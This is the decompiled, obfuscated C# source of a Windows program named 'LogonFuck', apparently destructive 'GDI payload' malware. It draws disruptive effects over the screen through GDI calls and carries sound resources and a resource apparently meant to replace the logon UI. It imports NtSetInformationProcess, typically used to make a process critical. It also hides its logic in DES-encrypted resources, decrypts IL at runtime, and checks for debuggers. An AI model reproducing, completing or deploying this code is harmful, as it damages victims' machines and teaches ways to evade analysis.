using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using LogonFuck.Properties;

namespace A;

internal abstract class _0007
{
	protected static int _0007 = Screen.PrimaryScreen.Bounds.Width;

	protected static int _0009 = Screen.PrimaryScreen.Bounds.Height;

	protected static Random _0007 = new Random();

	protected Thread _0007;

	public int _0011;

	public _0007(int _0007)
	{
		this._0011 = _0007;
	}

	[DllImport("User32.dll", EntryPoint = "GetDC")]
	protected static extern IntPtr _0009(IntPtr _0007);

	[DllImport("User32.dll", EntryPoint = "ReleaseDC")]
	protected static extern void _0009(IntPtr _0007, IntPtr P_1);

	[DllImport("gdi32.dll", EntryPoint = "CreateSolidBrush")]
	protected static extern IntPtr _0009(uint _0007);

	[DllImport("gdi32.dll", EntryPoint = "SelectObject")]
	protected static extern IntPtr _0009([In] IntPtr _0007, [In] IntPtr P_1);

	[DllImport("gdi32.dll", EntryPoint = "PatBlt")]
	protected static extern bool _0009(IntPtr _0007, int P_1, int _0011, int _0013, int _0012, CopyPixelOperation _0005);

	[DllImport("gdi32.dll", EntryPoint = "BitBlt")]
	protected static extern bool _0009([In] IntPtr _0007, int P_1, int _0011, int _0013, int _0012, [In] IntPtr _0005, int _0008, int _0017, CopyPixelOperation _001D);

	[DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
	protected static extern bool _0009([In] IntPtr _0007);

	[DllImport("gdi32.dll", EntryPoint = "PlgBlt")]
	protected static extern bool _0009(IntPtr _0007, Point[] P_1, IntPtr _0011, int _0013, int _0012, int _0005, int _0008, IntPtr _0017, int _001D, int P_9);

	public void _0011()
	{
		_0015._0007(this);
	}

	private void _0013()
	{
		_001C._0007(this);
	}

	public void _0012()
	{
		_0004._0007(this);
	}

	protected abstract void _0007(IntPtr _0007);
}
public sealed class _0009 : Form
{
	private IContainer m__0007;

	private Label m__0007;

	private Button m__0007;

	private Button m__0009;

	private Label m__0009;

	public _0009()
	{
		_0007();
		Control.CheckForIllegalCrossThreadCalls = (byte)_000E._0007(252) != 0;
	}

	private void _0007(object _0007, EventArgs P_1)
	{
		_000F._0007(this, _0007, P_1);
	}

	private void _0009(object _0007, EventArgs P_1)
	{
		_0010._0007(this, _0007, P_1);
	}

	protected override void Dispose(bool disposing)
	{
		_001F._0007(this, disposing);
	}

	private void _0007()
	{
		_0001._0007(this);
	}
}
internal sealed class _0011 : _0007
{
	public new int _0007;

	public new CopyPixelOperation _0007;

	private new Point[] m__0007;

	private new int _0009 = _000E._0007(288);

	public _0011(int _0007, int P_1, CopyPixelOperation _0011)
		: base(_0007)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		this._0007 = P_1;
		this._0007 = _0011;
		this.m__0007 = new Point[_000E._0007(292)];
		this.m__0007[_000E._0007(296)] = new Point(P_1 * _000E._0007(300), P_1);
		this.m__0007[_000E._0007(304)] = new Point(A._0007._0007 - P_1, P_1 * _000E._0007(308));
		this.m__0007[_000E._0007(312)] = new Point(P_1, A._0007._0009 - P_1 * _000E._0007(316));
	}

	protected override void _0007(IntPtr _0007)
	{
		_0007_0009._0007(this, _0007);
	}
}
internal sealed class _000D
{
	private static readonly Assembly m__0007;

	static _000D()
	{
		AppDomain.CurrentDomain.ResourceResolve += _0009;
		AppDomain.CurrentDomain.AssemblyResolve += _0007;
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string assemblyString = _0007(executingAssembly);
		_000D.m__0007 = Assembly.Load(assemblyString);
	}

	internal static void _0007()
	{
		_0004_0009._0007();
	}

	private static Assembly _0007(object _0007, ResolveEventArgs P_1)
	{
		return _000F_0009._0007(_0007, P_1);
	}

	private static string _0007(Assembly _0007)
	{
		return _0010_0009._0007(_0007);
	}

	private static Assembly _0009(object _0007, ResolveEventArgs P_1)
	{
		return _001F_0009._0007(_0007, P_1);
	}
}
internal sealed class _0013 : _0007
{
	public new int _0007;

	public _0013(int _0007)
		: base(_000E._0007(340))
	{
		this._0007 = _0007;
	}

	protected override void _0007(IntPtr _0007)
	{
		_0009_0009._0007(this, _0007);
	}
}
internal static class _0005
{
	[Flags]
	public enum _0012 : uint
	{
		_0007 = 0x1F0FFFu,
		_0009 = 1u,
		_0011 = 2u,
		_0013 = 8u,
		_0012 = 0x10u,
		_0005 = 0x20u,
		_0008 = 0x40u,
		_0017 = 0x80u,
		_001D = 0x100u,
		_000C = 0x200u,
		_000A = 0x400u,
		_001A = 0x1000u,
		_0006 = 0x100000u
	}

	public static string _0007 = Environment.GetFolderPath((Environment.SpecialFolder)_000E._0007(500)) + _001B._0007(1089);

	public static string _0009 = Environment.GetFolderPath((Environment.SpecialFolder)_000E._0007(504)) + _001B._0007(1132);

	private static readonly int m__0007 = _000E._0007(508);

	public static _0008 _0007 = new _0008(_000E._0007(512), (CopyPixelOperation)_000E._0007(516));

	public static _0017 _0007 = new _0017(_000E._0007(520), _000E._0007(524), (byte)_000E._0007(528) != 0);

	public static _001D _0007 = new _001D(_000E._0007(532));

	public static _0011 _0007 = new _0011(_000E._0007(536), _000E._0007(540), (CopyPixelOperation)_000E._0007(544));

	public static _0013 _0007 = new _0013(_000E._0007(548));

	[DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
	private static extern bool _0007(IntPtr _0007);

	[DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
	private static extern IntPtr _0007(_0012 _0007, bool P_1, int _0011);

	[DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess")]
	private static extern int _0007(IntPtr _0007, int P_1, ref int _0011, int _0013);

	[STAThread]
	private static void _0007()
	{
		_0011_0009._0007();
	}

	public static void _0009()
	{
		_0013_0009._0007();
	}

	private static void _0011()
	{
		_0012_0009._0007();
	}

	private static void _0013()
	{
		_0005_0009._0007();
	}

	private static void _0012()
	{
		_0008_0009._0007();
	}

	public static void _0005()
	{
		_0017_0009._0007();
	}
}
internal sealed class _0008 : _0007
{
	public new CopyPixelOperation _0007;

	public _0008(int _0007, CopyPixelOperation P_1)
		: base(_0007)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		this._0007 = P_1;
	}

	protected override void _0007(IntPtr _0007)
	{
		_001D_0009._0007(this, _0007);
	}
}
internal sealed class _0017 : _0007
{
	public new bool _0007;

	public new int _0007;

	private new double m__0007;

	private new int _0009;

	public _0017(int _0007, int P_1, bool _0011)
		: base(_0007)
	{
		this._0007 = P_1;
		this._0007 = _0011;
	}

	protected override void _0007(IntPtr _0007)
	{
		_000C_0009._0007(this, _0007);
	}
}
internal sealed class _001D : _0007
{
	protected new int _0007 = _000E._0007(728);

	protected new int _0009 = _000E._0007(732);

	protected new int _0011 = _000E._0007(736);

	protected int _0013;

	protected new int _0012;

	public _001D(int _0007)
		: base(_0007)
	{
		base._0011 = _0007;
	}

	protected override void _0007(IntPtr _0007)
	{
		_000A_0009._0007(this, _0007);
	}
}
[DebuggerNonUserCode]
[CompilerGenerated]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
internal sealed class _000C
{
	private static ResourceManager _0007;

	private static CultureInfo _0007;

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static ResourceManager ResourceManager => _001A_0009._0007();

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static CultureInfo Culture
	{
		get
		{
			return _0006_0009._0007();
		}
		set
		{
			_0003_0009._0007(value);
		}
	}

	internal static UnmanagedMemoryStream crazysound1 => _0018_0009._0007();

	internal static UnmanagedMemoryStream crazysound2 => _001E_0009._0007();

	internal static UnmanagedMemoryStream crazysound3 => _0014_0009._0007();

	internal static UnmanagedMemoryStream crazysound4 => _0019_0009._0007();

	internal static UnmanagedMemoryStream crazysound5 => _0002_0009._0007();

	internal static UnmanagedMemoryStream crazysound6 => _0016_0009._0007();

	internal static UnmanagedMemoryStream crazysound7 => _001B_0009._0007();

	internal static byte[] firelogonui => _000E_0009._0007();

	internal _000C()
	{
	}
}
internal sealed class _000E
{
	internal static readonly byte[] _0007;

	internal readonly int _0007;

	internal readonly int _0009;

	static _000E()
	{
		if (_000E._0007 == null)
		{
			string s = "TG9nb25GdWNrJQ==";
			byte[] array = Convert.FromBase64String(s);
			s = Encoding.UTF8.GetString(array, 0, array.Length);
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(s);
			_000E._0007 = _0016._0007(97L, manifestResourceStream);
		}
	}

	internal static int _0007(int _0007)
	{
		return BitConverter.ToInt32(_000E._0007, _0007);
	}

	internal static long _0007(int _0007)
	{
		return BitConverter.ToInt64(_000E._0007, _0007);
	}

	internal static float _0007(int _0007)
	{
		return BitConverter.ToSingle(_000E._0007, _0007);
	}

	internal static double _0007(int _0007)
	{
		return BitConverter.ToDouble(_000E._0007, _0007);
	}

	internal static void _0007(Array _0007, int P_1)
	{
		int num = 0;
		if ((_000E._0007[P_1] & 0x80) == 0)
		{
			num = _000E._0007[P_1];
			P_1++;
		}
		else if ((_000E._0007[P_1] & 0x40) == 0)
		{
			num = (_000E._0007[P_1] & -129) << 8;
			num |= _000E._0007[P_1 + 1];
			P_1 += 2;
		}
		else
		{
			num = (_000E._0007[P_1] & -193) << 24;
			num |= _000E._0007[P_1 + 1] << 16;
			num |= _000E._0007[P_1 + 2] << 8;
			num |= _000E._0007[P_1 + 3];
			P_1 += 4;
		}
		if (num >= 1)
		{
			Buffer.BlockCopy(_000E._0007, P_1, _0007, 0, num);
		}
	}
}
internal sealed class _001B
{
	internal static readonly byte[] _0007;

	internal readonly int _0007;

	static _001B()
	{
		if (_001B._0007 == null)
		{
			string s = "TG9nb25GdWNrJA==";
			byte[] array = Convert.FromBase64String(s);
			s = Encoding.UTF8.GetString(array, 0, array.Length);
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(s);
			_001B._0007 = _0016._0007(97L, manifestResourceStream);
		}
	}

	internal static string _0007(int _0007)
	{
		int num = 0;
		if ((_001B._0007[_0007] & 0x80) == 0)
		{
			num = _001B._0007[_0007];
			_0007++;
		}
		else if ((_001B._0007[_0007] & 0x40) == 0)
		{
			num = (_001B._0007[_0007] & -129) << 8;
			num |= _001B._0007[_0007 + 1];
			_0007 += 2;
		}
		else
		{
			num = (_001B._0007[_0007] & -193) << 24;
			num |= _001B._0007[_0007 + 1] << 16;
			num |= _001B._0007[_0007 + 2] << 8;
			num |= _001B._0007[_0007 + 3];
			_0007 += 4;
		}
		if (num < 1)
		{
			return string.Empty;
		}
		string str = Encoding.Unicode.GetString(_001B._0007, _0007, num);
		return string.Intern(str);
	}
}
internal sealed class _0016
{
	private static readonly object m__0007;

	private static readonly int m__0007;

	private static readonly int _0009;

	private static readonly MemoryStream m__0007;

	private static readonly MemoryStream _0009;

	private static readonly byte m__0007;

	static _0016()
	{
		_0016.m__0007 = null;
		_0009 = null;
		_0016.m__0007 = int.MaxValue;
		_0016._0009 = int.MinValue;
		_0016.m__0007 = new MemoryStream(0);
		_0009 = new MemoryStream(0);
		_0016.m__0007 = new object();
	}

	private static string _0007(Assembly _0007)
	{
		string text = _0007.FullName;
		int num = text.IndexOf(',');
		if (num >= 0)
		{
			text = text.Substring(0, num);
		}
		return text;
	}

	private static byte[] _0007(Assembly _0007)
	{
		try
		{
			string fullName = _0007.FullName;
			int num = fullName.IndexOf("PublicKeyToken=");
			if (num < 0)
			{
				num = fullName.IndexOf("publickeytoken=");
			}
			if (num < 0)
			{
				return null;
			}
			num += 15;
			if (fullName[num] == 'n' || fullName[num] == 'N')
			{
				return null;
			}
			string s = fullName.Substring(num, 16);
			long value = long.Parse(s, NumberStyles.HexNumber);
			byte[] bytes = BitConverter.GetBytes(value);
			Array.Reverse((Array)bytes);
			return bytes;
		}
		catch
		{
		}
		return null;
	}

	internal static byte[] _0007(Stream _0007)
	{
		lock (_0016.m__0007)
		{
			return _0016._0007(97L, (object)_0007);
		}
	}

	internal static byte[] _0007(long _0007, Stream P_1)
	{
		try
		{
			return _0016._0007(P_1);
		}
		catch
		{
			return _0016._0007(97L, (object)P_1);
		}
	}

	internal static byte[] _0007(long _0007, object P_1)
	{
		Stream stream = P_1 as Stream;
		Stream stream2 = stream;
		MemoryStream memoryStream = null;
		for (int i = 1; i < 4; i++)
		{
			stream.ReadByte();
		}
		ushort num = (ushort)stream.ReadByte();
		num = (ushort)(~num);
		if ((num & 2) != 0)
		{
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			byte[] array = new byte[8];
			stream.Read(array, 0, 8);
			dESCryptoServiceProvider.IV = array;
			byte[] array2 = new byte[8];
			stream.Read(array2, 0, 8);
			bool flag = true;
			byte[] array3 = array2;
			for (int j = 0; j < array3.Length; j++)
			{
				if (array3[j] != 0)
				{
					flag = false;
					break;
				}
			}
			if (flag)
			{
				array2 = _0016._0007(Assembly.GetExecutingAssembly());
			}
			dESCryptoServiceProvider.Key = array2;
			if (_0016.m__0007 == null)
			{
				if (_0016.m__0007 == int.MaxValue)
				{
					_0016.m__0007.Capacity = (int)stream.Length;
				}
				else
				{
					_0016.m__0007.Capacity = _0016.m__0007;
				}
			}
			_0016.m__0007.Position = 0L;
			ICryptoTransform cryptoTransform = dESCryptoServiceProvider.CreateDecryptor();
			int inputBlockSize = cryptoTransform.InputBlockSize;
			_ = cryptoTransform.OutputBlockSize;
			byte[] array4 = new byte[cryptoTransform.OutputBlockSize];
			byte[] array5 = new byte[cryptoTransform.InputBlockSize];
			int k;
			for (k = (int)stream.Position; k + inputBlockSize < stream.Length; k += inputBlockSize)
			{
				stream.Read(array5, 0, inputBlockSize);
				int count = cryptoTransform.TransformBlock(array5, 0, inputBlockSize, array4, 0);
				_0016.m__0007.Write(array4, 0, count);
			}
			stream.Read(array5, 0, (int)(stream.Length - k));
			byte[] array6 = cryptoTransform.TransformFinalBlock(array5, 0, (int)(stream.Length - k));
			_0016.m__0007.Write(array6, 0, array6.Length);
			stream2 = _0016.m__0007;
			stream2.Position = 0L;
			memoryStream = _0016.m__0007;
		}
		if ((num & 8) != 0)
		{
			if (_0016._0009 == null)
			{
				if (_0016._0009 == int.MinValue)
				{
					_0016._0009.Capacity = (int)stream2.Length * 2;
				}
				else
				{
					_0016._0009.Capacity = _0016._0009;
				}
			}
			_0016._0009.Position = 0L;
			DeflateStream deflateStream = new DeflateStream(stream2, CompressionMode.Decompress);
			int num2 = 1000;
			byte[] buffer = new byte[num2];
			int num3;
			do
			{
				num3 = deflateStream.Read(buffer, 0, num2);
				if (num3 > 0)
				{
					_0016._0009.Write(buffer, 0, num3);
				}
			}
			while (num3 >= num2);
			memoryStream = _0016._0009;
		}
		if (memoryStream != null)
		{
			return memoryStream.ToArray();
		}
		byte[] array7 = new byte[stream.Length - stream.Position];
		stream.Read(array7, 0, array7.Length);
		return array7;
	}
}
internal sealed class _0002
{
	[StructLayout(LayoutKind.Sequential)]
	internal sealed class _000A
	{
		internal IntPtr _0007;

		internal IntPtr _0009;

		internal IntPtr _0011;

		internal IntPtr _0013;

		internal IntPtr _0012;

		internal IntPtr _0005;
	}

	internal delegate int _001A(IntPtr ProcessHandle, int ProcessInformationClass, _000A ProcessInformation, uint ProcessInformationLength, out uint ReturnLength);

	internal delegate int _0006(IntPtr ProcessHandle, int ProcessInformationClass, out uint debugPort, uint ProcessInformationLength, out uint ReturnLength);

	internal delegate int _0003();

	internal delegate void _0018([MarshalAs(UnmanagedType.LPStr)] string lpOutputString);

	internal delegate int _001E(IntPtr hProcess, ref int pbDebuggerPresent);

	internal delegate int _0014(IntPtr wnd, IntPtr lParam);

	internal delegate int _0019(_0014 lpEnumFunc, IntPtr lParam);

	internal static uint _0007;

	internal static uint _0009;

	internal static int _0007;

	private static bool m__0007;

	[DllImport("kernel32.dll", EntryPoint = "SetLastError", ExactSpelling = true)]
	internal static extern void _0007(uint _0007);

	[DllImport("kernel32.dll", EntryPoint = "CloseHandle", ExactSpelling = true)]
	internal static extern int _0007(IntPtr _0007);

	[DllImport("kernel32.dll", EntryPoint = "OpenProcess", ExactSpelling = true)]
	internal static extern IntPtr _0009(uint _0007, int P_1, uint _0011);

	[DllImport("kernel32.dll", EntryPoint = "GetCurrentProcessId", ExactSpelling = true)]
	internal static extern uint _0007();

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "LoadLibrary", SetLastError = true)]
	internal static extern IntPtr _0007(string _0007);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _001A _0007(IntPtr _0007, string P_1);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _0006 _0007(IntPtr _0007, string P_1);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _001E _0007(IntPtr _0007, string P_1);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _0003 _0007(IntPtr _0007, string P_1);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _0018 _0007(IntPtr _0007, string P_1);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true)]
	internal static extern _0019 _0007(IntPtr _0007, string P_1);

	private static int _0007(IntPtr _0007, IntPtr P_1)
	{
		return _0020_0009._0007(_0007, P_1);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "GetClassName")]
	internal static extern int _0007(IntPtr _0007, StringBuilder P_1, int _0011);

	internal static string _0009(IntPtr _0007)
	{
		return _000B_0009._0007(_0007);
	}

	internal static void _0007()
	{
		_0015_0009._0007();
	}

	internal static bool _0007()
	{
		return _001C_0009._0007();
	}
}
internal sealed class _000B
{
	public sealed class _0020
	{
		private static OpCode[] m__0007;

		private static OpCode[] m__0009;

		private int m__0007;

		private byte[] m__0007;

		private DynamicILInfo m__0007;

		private Module m__0007;

		private Type[] m__0007;

		private Type[] m__0009;

		static _0020()
		{
			_0020.m__0007 = new OpCode[256];
			_0020.m__0009 = new OpCode[256];
			FieldInfo[] fields = typeof(OpCodes).GetFields(BindingFlags.Static | BindingFlags.Public);
			foreach (FieldInfo fieldInfo in fields)
			{
				OpCode opCode = (OpCode)fieldInfo.GetValue(null);
				ushort num = (ushort)opCode.Value;
				if (num < 256)
				{
					_0020.m__0007[num] = opCode;
				}
				else if ((num & 0xFF00) == 65024)
				{
					_0020.m__0009[num & 0xFF] = opCode;
				}
			}
		}

		public _0020(MethodBase _0007, byte[] P_1, DynamicILInfo _0011)
		{
			this.m__0007 = _0011;
			this.m__0007 = P_1;
			this.m__0007 = 0;
			this.m__0007 = _0007.Module;
			this.m__0007 = ((_0007 is ConstructorInfo) ? null : _0007.GetGenericArguments());
			this.m__0009 = (((object)_0007.DeclaringType == null) ? null : _0007.DeclaringType.GetGenericArguments());
		}

		internal void _0007()
		{
			while (this.m__0007 < this.m__0007.Length)
			{
				_0007();
			}
		}

		private object _0007()
		{
			int num = this.m__0007;
			OpCode nop = OpCodes.Nop;
			int num2 = 0;
			byte b = _0007();
			if (b != 254)
			{
				nop = _0020.m__0007[b];
			}
			else
			{
				b = _0007();
				nop = _0020.m__0009[b];
			}
			switch (nop.OperandType)
			{
			case OperandType.InlineNone:
				return null;
			case OperandType.ShortInlineBrTarget:
				_0007(1);
				return null;
			case OperandType.InlineBrTarget:
				_0007(4);
				return null;
			case OperandType.ShortInlineI:
				_0007(1);
				return null;
			case OperandType.InlineI:
				_0007(4);
				return null;
			case OperandType.InlineI8:
				_0007(8);
				return null;
			case OperandType.ShortInlineR:
				_0007(4);
				return null;
			case OperandType.InlineR:
				_0007(8);
				return null;
			case OperandType.ShortInlineVar:
				_0007(1);
				return null;
			case OperandType.InlineVar:
				_0007(2);
				return null;
			case OperandType.InlineString:
				num2 = _0007();
				_0009(this.m__0007.GetTokenFor(this.m__0007.ResolveString(num2)), num + nop.Size);
				return null;
			case OperandType.InlineSig:
				num2 = _0007();
				_0009(this.m__0007.GetTokenFor(this.m__0007.ResolveSignature(num2)), num + nop.Size);
				return null;
			case OperandType.InlineMethod:
			{
				num2 = _0007();
				MethodBase methodBase2 = this.m__0007.ResolveMethod(num2, this.m__0009, this.m__0007);
				_0009(this.m__0007.GetTokenFor(methodBase2.MethodHandle, methodBase2.DeclaringType.TypeHandle), num + nop.Size);
				return null;
			}
			case OperandType.InlineField:
			{
				num2 = _0007();
				FieldInfo fieldInfo2 = this.m__0007.ResolveField(num2, this.m__0009, this.m__0007);
				_0009(this.m__0007.GetTokenFor(fieldInfo2.FieldHandle), num + nop.Size);
				return null;
			}
			case OperandType.InlineType:
			{
				num2 = _0007();
				Type type2 = this.m__0007.ResolveType(num2, this.m__0009, this.m__0007);
				_0009(this.m__0007.GetTokenFor(type2.TypeHandle), num + nop.Size);
				return null;
			}
			case OperandType.InlineTok:
			{
				num2 = _0007();
				MemberInfo memberInfo = this.m__0007.ResolveMember(num2, this.m__0009, this.m__0007);
				if (memberInfo.MemberType == MemberTypes.TypeInfo || memberInfo.MemberType == MemberTypes.NestedType)
				{
					Type type = memberInfo as Type;
					num2 = this.m__0007.GetTokenFor(type.TypeHandle);
				}
				else if (memberInfo.MemberType == MemberTypes.Method || memberInfo.MemberType == MemberTypes.Constructor)
				{
					MethodBase methodBase = memberInfo as MethodBase;
					num2 = this.m__0007.GetTokenFor(methodBase.MethodHandle, methodBase.DeclaringType.TypeHandle);
				}
				else if (memberInfo.MemberType == MemberTypes.Field)
				{
					FieldInfo fieldInfo = memberInfo as FieldInfo;
					num2 = this.m__0007.GetTokenFor(fieldInfo.FieldHandle);
				}
				_0009(num2, num + nop.Size);
				return null;
			}
			case OperandType.InlineSwitch:
			{
				int num3 = _0007();
				_0007(num3 * 4);
				return null;
			}
			default:
				throw new BadImageFormatException("unexpected OperandType " + nop.OperandType);
			}
		}

		private void _0007(int _0007)
		{
			this.m__0007 += _0007;
		}

		private byte _0007()
		{
			return this.m__0007[this.m__0007++];
		}

		private int _0007()
		{
			int startIndex = this.m__0007;
			this.m__0007 += 4;
			return BitConverter.ToInt32(this.m__0007, startIndex);
		}

		private void _0009(int _0007, int P_1)
		{
			this.m__0007[P_1++] = (byte)_0007;
			this.m__0007[P_1++] = (byte)(_0007 >> 8);
			this.m__0007[P_1++] = (byte)(_0007 >> 16);
			this.m__0007[P_1++] = (byte)(_0007 >> 24);
		}
	}

	internal static readonly byte[] _0007;

	internal static readonly Dictionary<int, int> _0007;

	private static readonly ModuleHandle m__0007;

	internal readonly int _0007;

	static _000B()
	{
		if (_000B._0007 == null)
		{
			string s = "TG9nb25GdWNrKg==";
			byte[] array = Convert.FromBase64String(s);
			s = Encoding.UTF8.GetString(array, 0, array.Length);
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(s);
			_000B._0007 = _0016._0007(97L, manifestResourceStream);
			_000B._0007 = new Dictionary<int, int>();
			using BinaryReader binaryReader = new BinaryReader(new MemoryStream(_000B._0007, writable: false));
			int num = binaryReader.ReadInt32();
			for (int i = 0; i < num; i++)
			{
				int key = binaryReader.ReadInt32();
				int value = binaryReader.ReadInt32();
				_000B._0007[key] = value;
			}
		}
		if ((object)typeof(MulticastDelegate) != null)
		{
			_000B.m__0007 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
		}
	}

	internal static void _0007(int _0007, int P_1, int _0011)
	{
		Type typeFromHandle;
		MethodBase methodBase;
		try
		{
			typeFromHandle = Type.GetTypeFromHandle(_000B.m__0007.ResolveTypeHandle(_0007));
			object methodFromHandle = MethodBase.GetMethodFromHandle(_000B.m__0007.ResolveMethodHandle(P_1), _000B.m__0007.ResolveTypeHandle(_0011));
			methodBase = (MethodBase)methodFromHandle;
		}
		catch (Exception)
		{
			throw;
		}
		FieldInfo[] fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
		foreach (FieldInfo fieldInfo in fields)
		{
			try
			{
				DynamicMethod dynamicMethod = null;
				MethodBody methodBody = methodBase.GetMethodBody();
				Type[] parameterTypes = _000B._0007(methodBase);
				dynamicMethod = new DynamicMethod(methodBase.DeclaringType.FullName + "." + methodBase.Name + "_Encrypted$", (methodBase is ConstructorInfo) ? null : ((MethodInfo)methodBase).ReturnType, parameterTypes, methodBase.DeclaringType, skipVisibility: true);
				_000B._0007.TryGetValue(_0007, out var value);
				DynamicILInfo dynamicILInfo = dynamicMethod.GetDynamicILInfo();
				_000B._0007(methodBody, dynamicILInfo);
				_000B._0007(ref value, methodBase, dynamicILInfo);
				_000B._0007(ref value, dynamicILInfo);
				Delegate value2 = dynamicMethod.CreateDelegate(typeFromHandle);
				fieldInfo.SetValue(null, value2);
			}
			catch (Exception)
			{
			}
		}
	}

	private static void _0007(ref int _0007, MethodBase P_1, DynamicILInfo _0011)
	{
		int maxStackSize = BitConverter.ToInt32(_000B._0007, _0007);
		_0007 += 4;
		int num = BitConverter.ToInt32(_000B._0007, _0007);
		_0007 += 4;
		byte[] array = new byte[num];
		Buffer.BlockCopy(_000B._0007, _0007, array, 0, num);
		_0020 obj = new _0020(P_1, array, _0011);
		obj._0007();
		_0011.SetCode(array, maxStackSize);
		_0007 += num;
	}

	private static void _0007(MethodBody _0007, DynamicILInfo P_1)
	{
		SignatureHelper localVarSigHelper = SignatureHelper.GetLocalVarSigHelper();
		foreach (LocalVariableInfo localVariable in _0007.LocalVariables)
		{
			localVarSigHelper.AddArgument(localVariable.LocalType, localVariable.IsPinned);
		}
		P_1.SetLocalSignature(localVarSigHelper.GetSignature());
	}

	private static void _0007(ref int _0007, DynamicILInfo P_1)
	{
		int num = BitConverter.ToInt32(_000B._0007, _0007);
		_0007 += 4;
		if (num == 0)
		{
			return;
		}
		byte[] array = new byte[num];
		Buffer.BlockCopy(_000B._0007, _0007, array, 0, num);
		int num2 = 4;
		int num3 = (num - 4) / 24;
		for (int i = 0; i < num3; i++)
		{
			ExceptionHandlingClauseOptions exceptionHandlingClauseOptions = (ExceptionHandlingClauseOptions)BitConverter.ToInt32(array, num2);
			num2 += 20;
			switch (exceptionHandlingClauseOptions)
			{
			case ExceptionHandlingClauseOptions.Clause:
			{
				RuntimeTypeHandle type = _000B.m__0007.ResolveTypeHandle(BitConverter.ToInt32(array, num2));
				int tokenFor = P_1.GetTokenFor(type);
				_000B._0007(tokenFor, num2, array);
				break;
			}
			case ExceptionHandlingClauseOptions.Fault:
				throw new NotSupportedException("dynamic method does not support fault clause");
			}
			num2 += 4;
		}
		P_1.SetExceptions(array);
	}

	public static void _0007(int _0007, int P_1, byte[] _0011)
	{
		_0011[P_1++] = (byte)_0007;
		_0011[P_1++] = (byte)(_0007 >> 8);
		_0011[P_1++] = (byte)(_0007 >> 16);
		_0011[P_1++] = (byte)(_0007 >> 24);
	}

	private static Type[] _0007(MethodBase _0007)
	{
		ParameterInfo[] parameters = _0007.GetParameters();
		int num = parameters.Length;
		if (!_0007.IsStatic)
		{
			num++;
		}
		Type[] array = new Type[num];
		int num2 = 0;
		if (!_0007.IsStatic)
		{
			if (_0007.DeclaringType.IsValueType)
			{
				array[0] = _0007.DeclaringType.MakeByRefType();
			}
			else
			{
				array[0] = _0007.DeclaringType;
			}
			num2++;
		}
		int num3 = 0;
		while (num3 < parameters.Length)
		{
			array[num2] = parameters[num3].ParameterType;
			num3++;
			num2++;
		}
		return array;
	}
}
internal delegate void _0001(_0009 P_0);
internal delegate void _0004(_0007 P_0);
internal delegate void _000F(_0009 P_0, object p1, EventArgs p2);
internal delegate void _0010(_0009 P_0, object p1, EventArgs p2);
internal delegate void _0015(_0007 P_0);
internal delegate void _001C(_0007 P_0);
internal delegate void _001F(_0009 P_0, bool p1);
internal delegate int _0020_0009(IntPtr p0, IntPtr p1);
internal delegate UnmanagedMemoryStream _0002_0009();
internal delegate void _0003_0009(CultureInfo p0);
internal delegate void _0004_0009();
internal delegate void _0005_0009();
internal delegate CultureInfo _0006_0009();
internal delegate void _0007_0009(_0011 P_0, IntPtr p1);
internal delegate void _0008_0009();
internal delegate byte[] _000E_0009();
internal delegate Assembly _000F_0009(object p0, ResolveEventArgs p1);
internal delegate string _0010_0009(Assembly p0);
internal delegate void _0011_0009();
internal delegate void _0012_0009();
internal delegate void _0013_0009();
internal delegate UnmanagedMemoryStream _0014_0009();
internal delegate void _0015_0009();
internal delegate UnmanagedMemoryStream _0016_0009();
internal delegate void _0017_0009();
internal delegate UnmanagedMemoryStream _0018_0009();
internal delegate UnmanagedMemoryStream _0019_0009();
internal delegate ResourceManager _001A_0009();
internal delegate UnmanagedMemoryStream _001B_0009();
internal delegate bool _001C_0009();
internal delegate void _001D_0009(_0008 P_0, IntPtr p1);
internal delegate UnmanagedMemoryStream _001E_0009();
internal delegate Assembly _001F_0009(object p0, ResolveEventArgs p1);
internal delegate void _0009_0009(_0013 P_0, IntPtr p1);
internal delegate void _000A_0009(_001D P_0, IntPtr p1);
internal delegate string _000B_0009(IntPtr p0);
internal delegate void _000C_0009(_0017 P_0, IntPtr p1);
internal delegate Settings _000D_0009();
